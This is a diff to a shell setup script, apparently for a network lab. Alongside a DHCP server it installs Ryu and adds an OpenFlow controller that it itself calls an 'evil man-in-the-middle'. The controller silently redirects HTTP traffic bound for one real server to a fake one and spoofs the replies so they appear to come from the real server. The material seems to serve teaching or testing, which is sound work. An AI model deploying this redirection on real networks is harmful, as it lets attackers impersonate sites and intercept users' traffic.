@@ -91,6 +91,74 @@ service isc-dhcp-server restart
 
 ##############################################################################
 
+# set up a Ryu man-in-the-middle controller
+
+if ! command -v ryu-manager > /dev/null; then
+  if ! command -v pip3 > /dev/null; then
+    apt-get install -y python3-pip
+  fi
+  pip3 install ryu
+fi
+command -v ryu-manager > /dev/null
+
+cat > /usr/local/bin/mitm.py <<'MY_RYU_APP'
+#!/bin/sh
+''''exec /usr/bin/env ryu-manager --verbose --ofp-listen-host 172.25.0.1 --ofp-tcp-listen-port 6653 "$0";':'''
+
+REAL_SERVER = ('140.112.8.116', 80)
+FAKE_SERVER = ('140.109.20.229', 80)
+
+from ryu.base import app_manager
+from ryu.controller import handler
+from ryu.controller import ofp_event
+from ryu.ofproto import ofproto_v1_3
+
+class MitmSwitch(app_manager.RyuApp):
+
+    OFP_VERSIONS = [ofproto_v1_3.OFP_VERSION]
+
+    def __init__(self, *args, **kwargs):
+        super(MitmSwitch, self).__init__(*args, **kwargs)
+
+    @handler.set_ev_cls(ofp_event.EventOFPSwitchFeatures, handler.CONFIG_DISPATCHER)
+    def switch_features_handler(self, ev):
+        datapath = ev.msg.datapath
+        ofp = datapath.ofproto
+        ofp_parser = datapath.ofproto_parser
+
+        del_all_flows(datapath)
+
+        match = ofp_parser.OFPMatch()
+        actions = [ofp_parser.OFPActionOutput(ofp.OFPP_NORMAL)]
+        add_flow(datapath, match, actions, priority=0)
+
+        match = ofp_parser.OFPMatch(eth_type=0x0800, ip_proto=6, ipv4_dst=REAL_SERVER[0], tcp_dst=REAL_SERVER[1])
+        actions = [ofp_parser.OFPActionSetField(ipv4_dst=FAKE_SERVER[0]), ofp_parser.OFPActionSetField(tcp_dst=FAKE_SERVER[1]), ofp_parser.OFPActionOutput(ofp.OFPP_NORMAL)]
+        add_flow(datapath, match, actions, priority=65535)
+
+        match = ofp_parser.OFPMatch(eth_type=0x0800, ip_proto=6, ipv4_src=FAKE_SERVER[0], tcp_src=FAKE_SERVER[1])
+        actions = [ofp_parser.OFPActionSetField(ipv4_src=REAL_SERVER[0]), ofp_parser.OFPActionSetField(tcp_src=REAL_SERVER[1]), ofp_parser.OFPActionOutput(ofp.OFPP_NORMAL)]
+        add_flow(datapath, match, actions, priority=65535)
+
+def add_flow(datapath, match, actions, priority):
+    ofp = datapath.ofproto
+    ofp_parser = datapath.ofproto_parser
+
+    inst = [ofp_parser.OFPInstructionActions(ofp.OFPIT_APPLY_ACTIONS, actions)]
+    req = ofp_parser.OFPFlowMod(datapath=datapath, priority=priority, match=match, instructions=inst)
+    datapath.send_msg(req)
+
+def del_all_flows(datapath):
+    ofp = datapath.ofproto
+    ofp_parser = datapath.ofproto_parser
+
+    req = ofp_parser.OFPFlowMod(datapath=datapath, command=ofp.OFPFC_DELETE, out_port=ofp.OFPP_ANY, out_group=ofp.OFPG_ANY)
+    datapath.send_msg(req)
+MY_RYU_APP
+chmod +x /usr/local/bin/mitm.py
+
+##############################################################################
+
 echo '
 
 If you want to restart the DHCP server:
@@ -100,5 +168,9 @@ If you want to restart the DHCP server:
 If you want to see a list of all current DHCP leases:
 
 	dhcp-lease-list --lease /var/lib/dhcp/dhcpd.leases
+
+If you want to run the evil man-in-the-middle controller:
+
+	mitm.py
 
 '
